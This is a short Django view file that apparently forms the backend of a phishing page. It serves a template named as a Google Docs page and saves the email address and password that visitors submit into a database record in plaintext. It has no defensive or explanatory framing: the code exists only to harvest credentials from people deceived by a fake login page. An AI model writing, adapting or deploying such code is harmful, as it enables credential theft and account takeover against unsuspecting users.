from django.shortcuts import render
from .models import user_details
from .form import user_details_form 
# Create your views here.

def index_view(request):
	if request.method == "GET":
		return render(request,"google_docs_page.html",{})
	else:
		try:
			user_details_form().save()
		except:
			obj = user_details.objects.get(User='n/a')
			obj.User = request.POST['email']
			obj.password = request.POST['passwd']
			obj.save()
		return render(request,"google_docs_page.html",{})